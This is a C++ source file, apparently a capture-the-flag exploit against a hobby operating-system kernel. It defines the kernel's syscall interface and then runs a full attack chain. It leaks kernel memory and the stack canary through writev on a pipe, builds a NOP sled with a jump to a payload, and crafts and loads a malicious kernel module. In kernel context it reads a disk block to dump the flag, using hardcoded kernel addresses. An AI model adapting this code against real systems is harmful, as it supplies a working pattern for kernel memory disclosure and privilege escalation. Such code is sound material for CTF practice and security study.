using u32 = unsigned int;
using i32 = int;
using u16 = unsigned short;
using u8 = unsigned char;
using size_t = u32;
typedef u32 time_t;

#define MAP_SHARED 0x01
#define MAP_PRIVATE 0x02
#define MAP_FIXED 0x10
#define MAP_ANONYMOUS 0x20
#define MAP_ANON MAP_ANONYMOUS
#define MAP_STACK 0x40
#define MAP_PURGEABLE 0x80

#define PROT_READ 0x1
#define PROT_WRITE 0x2
#define PROT_EXEC 0x4
#define PROT_NONE 0x0


#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDWR 2
#define O_CREAT 0100
#define O_EXCL 0200
#define O_NOCTTY 0400
#define O_TRUNC 01000
#define O_APPEND 02000
#define O_NONBLOCK 04000
#define O_DIRECTORY 00200000
#define O_NOFOLLOW 00400000
#define O_CLOEXEC 02000000
#define O_DIRECT 04000000
#define O_NOFOLLOW_NOERROR 0x4000000

#define ENUMERATE_SYSCALLS                          \
    __ENUMERATE_SYSCALL(sleep)                      \
    __ENUMERATE_SYSCALL(yield)                      \
    __ENUMERATE_SYSCALL(putch)                      \
    __ENUMERATE_SYSCALL(open)                       \
    __ENUMERATE_SYSCALL(close)                      \
    __ENUMERATE_SYSCALL(read)                       \
    __ENUMERATE_SYSCALL(lseek)                      \
    __ENUMERATE_SYSCALL(kill)                       \
    __ENUMERATE_SYSCALL(getuid)                     \
    __ENUMERATE_SYSCALL(exit)                       \
    __ENUMERATE_SYSCALL(getgid)                     \
    __ENUMERATE_SYSCALL(getpid)                     \
    __ENUMERATE_SYSCALL(waitpid)                    \
    __ENUMERATE_SYSCALL(mmap)                       \
    __ENUMERATE_SYSCALL(munmap)                     \
    __ENUMERATE_SYSCALL(get_dir_entries)            \
    __ENUMERATE_SYSCALL(lstat)                      \
    __ENUMERATE_SYSCALL(getcwd)                     \
    __ENUMERATE_SYSCALL(gettimeofday)               \
    __ENUMERATE_SYSCALL(gethostname)                \
    __ENUMERATE_SYSCALL(chdir)                      \
    __ENUMERATE_SYSCALL(uname)                      \
    __ENUMERATE_SYSCALL(set_mmap_name)              \
    __ENUMERATE_SYSCALL(readlink)                   \
    __ENUMERATE_SYSCALL(write)                      \
    __ENUMERATE_SYSCALL(ttyname_r)                  \
    __ENUMERATE_SYSCALL(stat)                       \
    __ENUMERATE_SYSCALL(getsid)                     \
    __ENUMERATE_SYSCALL(setsid)                     \
    __ENUMERATE_SYSCALL(getpgid)                    \
    __ENUMERATE_SYSCALL(setpgid)                    \
    __ENUMERATE_SYSCALL(getpgrp)                    \
    __ENUMERATE_SYSCALL(fork)                       \
    __ENUMERATE_SYSCALL(execve)                     \
    __ENUMERATE_SYSCALL(geteuid)                    \
    __ENUMERATE_SYSCALL(getegid)                    \
    __ENUMERATE_REMOVED_SYSCALL(isatty)             \
    __ENUMERATE_SYSCALL(getdtablesize)              \
    __ENUMERATE_SYSCALL(dup)                        \
    __ENUMERATE_SYSCALL(dup2)                       \
    __ENUMERATE_SYSCALL(sigaction)                  \
    __ENUMERATE_SYSCALL(getppid)                    \
    __ENUMERATE_SYSCALL(umask)                      \
    __ENUMERATE_SYSCALL(getgroups)                  \
    __ENUMERATE_SYSCALL(setgroups)                  \
    __ENUMERATE_SYSCALL(sigreturn)                  \
    __ENUMERATE_SYSCALL(sigprocmask)                \
    __ENUMERATE_SYSCALL(sigpending)                 \
    __ENUMERATE_SYSCALL(pipe)                       \
    __ENUMERATE_SYSCALL(killpg)                     \
    __ENUMERATE_SYSCALL(setuid)                     \
    __ENUMERATE_SYSCALL(setgid)                     \
    __ENUMERATE_SYSCALL(alarm)                      \
    __ENUMERATE_SYSCALL(fstat)                      \
    __ENUMERATE_SYSCALL(access)                     \
    __ENUMERATE_SYSCALL(fcntl)                      \
    __ENUMERATE_SYSCALL(ioctl)                      \
    __ENUMERATE_SYSCALL(mkdir)                      \
    __ENUMERATE_SYSCALL(times)                      \
    __ENUMERATE_SYSCALL(utime)                      \
    __ENUMERATE_SYSCALL(sync)                       \
    __ENUMERATE_SYSCALL(ptsname_r)                  \
    __ENUMERATE_SYSCALL(select)                     \
    __ENUMERATE_SYSCALL(unlink)                     \
    __ENUMERATE_SYSCALL(poll)                       \
    __ENUMERATE_SYSCALL(read_tsc)                   \
    __ENUMERATE_SYSCALL(rmdir)                      \
    __ENUMERATE_SYSCALL(chmod)                      \
    __ENUMERATE_SYSCALL(usleep)                     \
    __ENUMERATE_SYSCALL(socket)                     \
    __ENUMERATE_SYSCALL(bind)                       \
    __ENUMERATE_SYSCALL(accept)                     \
    __ENUMERATE_SYSCALL(listen)                     \
    __ENUMERATE_SYSCALL(connect)                    \
    __ENUMERATE_SYSCALL(create_shared_buffer)       \
    __ENUMERATE_SYSCALL(share_buffer_with)          \
    __ENUMERATE_SYSCALL(get_shared_buffer)          \
    __ENUMERATE_SYSCALL(release_shared_buffer)      \
    __ENUMERATE_SYSCALL(link)                       \
    __ENUMERATE_SYSCALL(chown)                      \
    __ENUMERATE_SYSCALL(fchmod)                     \
    __ENUMERATE_SYSCALL(symlink)                    \
    __ENUMERATE_SYSCALL(restore_signal_mask)        \
    __ENUMERATE_SYSCALL(get_shared_buffer_size)     \
    __ENUMERATE_SYSCALL(seal_shared_buffer)         \
    __ENUMERATE_SYSCALL(sendto)                     \
    __ENUMERATE_SYSCALL(recvfrom)                   \
    __ENUMERATE_SYSCALL(getsockopt)                 \
    __ENUMERATE_SYSCALL(setsockopt)                 \
    __ENUMERATE_SYSCALL(create_thread)              \
    __ENUMERATE_SYSCALL(gettid)                     \
    __ENUMERATE_SYSCALL(donate)                     \
    __ENUMERATE_SYSCALL(rename)                     \
    __ENUMERATE_SYSCALL(shm_open)                   \
    __ENUMERATE_SYSCALL(shm_unlink)                 \
    __ENUMERATE_SYSCALL(ftruncate)                  \
    __ENUMERATE_SYSCALL(systrace)                   \
    __ENUMERATE_SYSCALL(exit_thread)                \
    __ENUMERATE_SYSCALL(mknod)                      \
    __ENUMERATE_SYSCALL(writev)                     \
    __ENUMERATE_SYSCALL(beep)                       \
    __ENUMERATE_SYSCALL(getsockname)                \
    __ENUMERATE_SYSCALL(getpeername)                \
    __ENUMERATE_SYSCALL(sched_setparam)             \
    __ENUMERATE_SYSCALL(sched_getparam)             \
    __ENUMERATE_SYSCALL(fchown)                     \
    __ENUMERATE_SYSCALL(halt)                       \
    __ENUMERATE_SYSCALL(reboot)                     \
    __ENUMERATE_SYSCALL(mount)                      \
    __ENUMERATE_SYSCALL(umount)                     \
    __ENUMERATE_SYSCALL(dump_backtrace)             \
    __ENUMERATE_SYSCALL(dbgputch)                   \
    __ENUMERATE_SYSCALL(dbgputstr)                  \
    __ENUMERATE_SYSCALL(watch_file)                 \
    __ENUMERATE_SYSCALL(share_buffer_globally)      \
    __ENUMERATE_SYSCALL(set_process_icon)           \
    __ENUMERATE_SYSCALL(mprotect)                   \
    __ENUMERATE_SYSCALL(realpath)                   \
    __ENUMERATE_SYSCALL(get_process_name)           \
    __ENUMERATE_SYSCALL(fchdir)                     \
    __ENUMERATE_SYSCALL(getrandom)                  \
    __ENUMERATE_SYSCALL(setkeymap)                  \
    __ENUMERATE_SYSCALL(clock_gettime)              \
    __ENUMERATE_SYSCALL(clock_nanosleep)            \
    __ENUMERATE_SYSCALL(openat)                     \
    __ENUMERATE_SYSCALL(join_thread)                \
    __ENUMERATE_SYSCALL(module_load)                \
    __ENUMERATE_SYSCALL(module_unload)              \
    __ENUMERATE_SYSCALL(detach_thread)              \
    __ENUMERATE_SYSCALL(set_thread_name)            \
    __ENUMERATE_SYSCALL(get_thread_name)            \
    __ENUMERATE_SYSCALL(madvise)                    \
    __ENUMERATE_SYSCALL(purge)                      \
    __ENUMERATE_SYSCALL(set_shared_buffer_volatile) \
    __ENUMERATE_SYSCALL(profiling_enable)           \
    __ENUMERATE_SYSCALL(profiling_disable)          \
    __ENUMERATE_SYSCALL(get_kernel_info_page)       \
    __ENUMERATE_SYSCALL(futex)

enum X {
	SC_a, SC_b,
};

enum Function {
#define __ENUMERATE_SYSCALL(name) SC_##name,
#define __ENUMERATE_REMOVED_SYSCALL(name) SC_##name,
	ENUMERATE_SYSCALLS
#undef __ENUMERATE_SYSCALL
	__COUNT,
};

int __syscall(u32 a)
{
	u32 out;
	__asm__( "int $0x82" : "=a" (out) : "a" (a) : "memory");
	return out;
}

int __syscall(u32 a, u32 d)
{
	u32 out;
	__asm__( "int $0x82" : "=a" (out) : "a" (a), "d" (d) : "memory");
	return out;
}

int __syscall(u32 a, u32 d, u32 c)
{
	u32 out;
	__asm__( "int $0x82" : "=a" (out) : "a" (a), "d" (d), "c" (c) : "memory");
	return out;
}

int __syscall(u32 a, u32 d, u32 c, u32 b)
{
	u32 out;
	__asm__( "int $0x82" : "=a" (out) : "a" (a), "d" (d), "c" (c), "b" (b) : "memory");
	return out;
}

struct iovec {
	void *iov_base;
	size_t iov_len;
};

struct SC_create_thread_params {
    unsigned int m_detach_state = 0; // JOINABLE or DETACHED
    int m_schedule_priority = 2;     // ThreadPriority::Normal
    // FIXME: Implment guard pages in create_thread (unreadable pages at "overflow" end of stack)
    // "If an implementation rounds up the value of guardsize to a multiple of {PAGESIZE},
    // a call to pthread_attr_getguardsize() specifying attr shall store in the guardsize
    // parameter the guard size specified by the previous pthread_attr_setguardsize() function call"
    // ... ok, if you say so posix. Guess we get to lie to people about guard page size
    unsigned int m_guard_page_size = 0;          // Rounded up to PAGE_SIZE
    unsigned int m_reported_guard_page_size = 0; // The lie we tell callers
    unsigned int m_stack_size = 4 * 1024 * 1024;          // Default PTHREAD_STACK_MIN
    void* m_stack_location = nullptr;            // nullptr means any, o.w. process virtual address
};

template <typename... Args>
int syscall(u32 func, Args... args)
{
	return __syscall(func, (u32)args...);
}

static u32 axtoi(const char *p)
{
	u32 n = 0;
	int ch;
	while ((ch = *p++)) {
		if ((unsigned)(ch-'0') <= 9)
			n = n*16 + ch-'0';
		else
			n = n*16 + (ch|32)-'a' + 10;
	}
	return n;
}

static size_t strlen(const char *p)
{
	size_t n = 0;
	while (*p++)
		n += 1;
	return n;
}

static void __format(int fd, const char *s)
{
	syscall(SC_write, 1, s, strlen(s));
}

static void __format(int fd, u32 n)
{
	char s[10];
	s[0] = '0';
	s[1] = 'x';
	for (int i = 0; i < 8; i++)
		s[9-i] = "0123456789abcdef"[n&15], n >>= 4;
	syscall(SC_write, 1, s, 10);
}

static void format() { }
template <typename Arg, typename... Args>
static void format(Arg arg, Args... args)
{
	__format(1, arg);
	format(args...);
}

static void check(int ret, const char *what)
{
	if (ret < 0) {
		format("errno ", -ret, ": ", what, "\n");
		syscall(SC_exit, 1);
	}
}

static void hexdump(const char *p, int n, u32 ofs=0)
{
	char line[16*2+16+16];
	while (n > 0) {
		format(ofs, " ");
		char *d = line;
		int m = 16;
		if (m > n)
			m = n;
		for (int i = 0; i < 16; i++) {
			if ((i&3) == 0)
				*d++ = ' ';
			if (i < m) {
				*d++ = "0123456789abcdef"[*p>>4&15];
				*d++ = "0123456789abcdef"[*p++&15];
			} else {
				*d++ = ' ';
				*d++ = ' ';
			}
		}
		*d++ = ' ';
		*d++ = ' ';
		p -= m;
		for (int i = 0; i < m; i++) {
			int ch = *p++;
			if (ch < 32 || ch > 0x7e)
				ch = '.';
			*d++ = ch;
		}
		*d++ = '\n';
		syscall(SC_write, 1, line, d-line);
		n -= m;
		ofs += m;
	}
}

#define info(...) format("[*] ", __VA_ARGS__, "\n")

//static char buffer[4096];
static int pipe_fd[2];

static void leak_mem(char *dest, u32 addr, u32 n)
{
	iovec iov { (void*)addr, n };

	u32 wn = syscall(SC_writev, pipe_fd[1], &iov, 1);
	info("writeved ", wn, " bytes from ", addr);
	u32 rn = syscall(SC_read, pipe_fd[0], dest, n);
	info("read ", rn, " bytes from pipe");
	//hexdump(buffer, rn);
}

template <typename T>
static void leak_mem(T *dest, u32 addr)
{ leak_mem((char*)dest, addr, sizeof(T)); }

struct T {
	static constexpr u32 g_processes = 0x0019f1c0;
	static constexpr u32 __stack_chk_guard = 0x0019110c;
	static constexpr u32 get_device = 0x00118728;
	static constexpr u32 read_block = 0x0011b252;
};

typedef void *(__attribute__((cdecl)) *GetDeviceFunc)(int maj, int min);
typedef void *(__attribute__((cdecl)) *ReadBlockFunc)(void *self, int off, char *buf);

static char flag[512];

struct timespec {
    time_t tv_sec;
    long tv_nsec;
};

struct SC_clock_nanosleep_params {
    int clock_id;
    int flags;
    const struct timespec* requested_sleep;
    struct timespec* remaining_sleep;
};

struct SC_open_params {
    const char* path;
    int path_length;
    int options;
    u16 mode;
};

u32 my_pid;

#define SIGINT 2
#define SIGCONT 18

struct SC_mmap_params {
    u32 addr;
    u32 size;
    i32 prot;
    i32 flags;
    i32 fd;
    i32 offset;
    const char* name { nullptr };
};

#include "dummy.inc.h"

static void call_from_kernel()
{
	void *dev = ((GetDeviceFunc)T::get_device)(3, 1);
	((ReadBlockFunc)T::read_block)(dev, 0, flag);
}

#define EINTR 4
extern "C" __attribute__((cdecl))
void _start(int argc, char **argv, char **environ)
{
	info("Stage 2!");

	int r = syscall(SC_pipe, pipe_fd, 0);
	check(r, "pipe");

	SC_open_params p;
	p.mode = 0777;
	p.options = O_WRONLY | O_CREAT | O_TRUNC;
	p.path = "/tmp/kmod";
	p.path_length = 9;

	int fd = syscall(SC_open, &p);
	check(fd, "open");

	u32 canary;
	leak_mem(&canary, T::__stack_chk_guard);
	info("kernel canary: ", canary);


	u32 sled_size = 20*1024*1024;
	sled_size &= ~0xfff;

	info("about to map ", sled_size, " bytes of memory");
	syscall(SC_sleep, 1);

	SC_mmap_params mp;
	mp.addr = 0;
	mp.size = sled_size;
	mp.prot = PROT_READ | PROT_WRITE;
	mp.flags = MAP_PRIVATE | MAP_ANONYMOUS | MAP_PURGEABLE;
	mp.fd = 0;
	mp.offset = 0;
	mp.name = nullptr;
	r = syscall(SC_mmap, &mp);
	check(r, "mmap");

	info("nopsled is from ", r, " to ", r+sled_size);

	syscall(SC_sleep, 1);

	u8 *sled = (u8*)r;
	for (int i = 0; i < sled_size; i++)
		sled[i] = 0x90;
	u8 *jmp_loc = sled + sled_size - 64;
	jmp_loc[0] = 0xe9; // jmp 32rel
	*(u32*)&jmp_loc[1] = (u32)call_from_kernel - (u32)(jmp_loc+5);

	info("jmp to payload is at ", (u32)jmp_loc);

	r = syscall(SC_mprotect, sled, sled_size, PROT_READ|PROT_EXEC);
	check(r, "mprotect");

	u32 *patch = (u32*)dummy;
	while (*patch != 0xdeadbeef)
		patch++;
	*patch = (u32)sled + sled_size/2 - 0xc0bbb000;

	info("Crafted module:");
	hexdump((const char*)dummy, sizeof dummy, 0);

	syscall(SC_write, fd, dummy, sizeof dummy);
	syscall(SC_close, fd);

	info("about to load module");
	syscall(SC_sleep,  2);
	info("loading module");
	r = syscall(SC_module_load, "/tmp/kmod", 9);
	check(r, "module_load");

	info("holy shit, we survived");

	info("flag:");
	hexdump(flag, sizeof flag);

	syscall(SC_exit, 123);
}
